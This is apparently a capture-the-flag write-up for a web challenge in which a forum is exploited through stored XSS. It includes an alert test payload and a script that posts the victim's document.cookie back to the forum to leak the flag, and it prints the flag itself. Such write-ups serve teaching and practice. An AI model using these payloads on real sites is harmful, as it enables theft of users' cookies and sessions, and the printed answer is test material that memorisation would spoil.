# Writeup Exfiltration

## Challenge description
**Author: roypur**

**Difficulty: challenging**

**Category: web**

---


We have found a forum used by members of the Mother cult. The members are sitting behind an advanced firewall without access to the internet.
We need their super secret information.

[exfiltration.tghack.no](https://exfiltration.tghack.no)

## Writeup

The challenge text indicates that we need to get some information from someone who is using a forum.
When we need to get something from a different user on a website we often need to use XSS.
This time is no different.

To see if the website is vulnerable to XSS we can write the following code into the textfield.

```javascript
<script>
alert("vulnerable");
</script>
```

When we send the message the page reloads and we get an alert prompt in our window.
This means it's vulnerable.

The browser we need to run XSS against doesn't have access to the internet, which means
that we need to use the forum to transfer the secret information back to us.
If we look at the script.js file on the website we can see how the page sends the message to the server.

```javascript
document.addEventListener("DOMContentLoaded", () => {
    document.getElementById("btn").addEventListener("click", () => {
        let xhr = new XMLHttpRequest();
        xhr.open("post", window.location.href, true);
        xhr.onreadystatechange = () => {
            if (xhr.readyState == 4 && xhr.status == 200) {
                document.location.reload(true);
            }
        };
        xhr.send(document.getElementById("text").value);
    });
});
```

We can reuse parts of this code to get the data back to us.
To verify this we can try to run the following code.

```javascript
let xhr = new XMLHttpRequest();
xhr.open("post", window.location.href, true);
xhr.send("XSS works");
```

"XSS works" is posted to the forum and we know it works.

It is fairly common to have secrets in cookies.
We try to check if the user has any cookies with the following code.

```javascript
let xhr = new XMLHttpRequest();
xhr.open("post", window.location.href, true);
xhr.send(document.cookie);
```

And we get the flag as a post on the forum.

```
TG20{exfiltration_is_best_filtration}
```
